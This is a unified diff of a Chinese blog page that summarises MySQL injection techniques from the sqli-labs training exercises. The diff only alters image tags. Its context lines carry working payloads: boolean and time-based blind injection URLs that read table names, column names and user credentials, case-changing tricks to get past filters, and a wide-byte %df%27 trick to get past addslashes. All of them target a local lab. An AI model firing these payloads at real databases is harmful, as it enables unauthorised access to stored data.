@@ -138,7 +138,7 @@
 
   <article class="post-content">
     <h1>基于注入天书的mysql注入总结</h1>
-    <p><img alt="1.jpg" data-src="https://i.loli.net/2019/03/10/5c84cc486773d.jpg" class="lazyload"></p>
+    <p><img src="https://i.loli.net/2019/03/10/5c84cc486773d.jpg" alt="1.jpg"></p>
 <p>本篇基于注入天书的例子进行总结</p>
 <p>前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。</p>
 <a id="more"></a>
@@ -212,7 +212,7 @@
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>ascii(substr((<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%201</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure>
 <p>后面依次类推</p>
 <p>到这里我们就获取到了<code>security</code>数据库下 也就是当前数据库下的所有表名</p>
-<p><img alt="屏幕快照 2019-03-11 下午7.58.11.png" data-src="https://i.loli.net/2019/03/11/5c864d60e0dd5.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/03/11/5c864d60e0dd5.png" alt="屏幕快照 2019-03-11 下午7.58.11.png"></p>
 <h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>来看users表下的列</p>
 <p>首先还是和表类似猜测users表下列的个数</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>count(column_name)from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name=<span class="symbol">%22</span>users<span class="symbol">%22</span>)=<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
@@ -235,7 +235,7 @@
 <p>判断出users表里13条数据信息</p>
 <p>下图 是users表下的内容 </p>
 <p>对比笔记看起来更直观吧</p>
-<p><img alt="屏幕快照 2019-03-11 下午7.37.59.png" data-src="https://i.loli.net/2019/03/11/5c8648ace9cdf.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/03/11/5c8648ace9cdf.png" alt="屏幕快照 2019-03-11 下午7.37.59.png"></p>
 <p>紧着着判断 13条数据第一条数据的长度</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and (<span class="keyword">select</span> <span class="keyword">length</span>(username) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
@@ -259,7 +259,7 @@
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less-<span class="number">5</span>/?id=<span class="number">1</span><span class="symbol">'and</span> sleep(<span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p>感觉和布尔的区别 就是加上了sleep if</p>
 <p>后面的话就不重复造轮子了 同理！！！</p>
-<p><img alt="8B753C84DCF432C1F37BA72A650E89B2.gif" data-src="https://i.loli.net/2019/03/13/5c88d78808b5a.gif" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/03/13/5c88d78808b5a.gif" alt="8B753C84DCF432C1F37BA72A650E89B2.gif"></p>
 <h2 id="过滤注入关键词"><a href="#过滤注入关键词" class="headerlink" title="过滤注入关键词"></a>过滤注入关键词</h2><h3 id="过滤了and-or"><a href="#过滤了and-or" class="headerlink" title="过滤了and or"></a>过滤了and or</h3><p>绕过思路</p>
 <ol>
 <li>大小写变形 OR,Or oR</li>
@@ -286,7 +286,7 @@
 <p>例如<code>%aa%5c</code> 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围）</p>
 <p>一般情况下程序员会把接收到的预定义字符 默认前面添加一个\</p>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（'）= （<span class="symbol">\'</span>）</span><br><span class="line">双引号（"） = （<span class="symbol">\"</span>）</span><br><span class="line">反斜杠（<span class="symbol">\）</span> = （<span class="symbol">\\</span>）</span><br></pre></td></tr></table></figure>
-<p><img alt="屏幕快照 2019-03-15 下午4.26.44.png" data-src="https://i.loli.net/2019/03/15/5c8b61d4df35d.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/03/15/5c8b61d4df35d.png" alt="屏幕快照 2019-03-15 下午4.26.44.png"></p>
 <p>这里注入天书第32题举例前端输入<code>%df%27</code>时</p>
 <p>经过<code>addslashes</code>函数转义变成了<code>%df%5c%27</code>%5c 是反斜杠</p>
 <p>mysql服务器对查询语句进行编码两个字符转换成一个汉字</p>
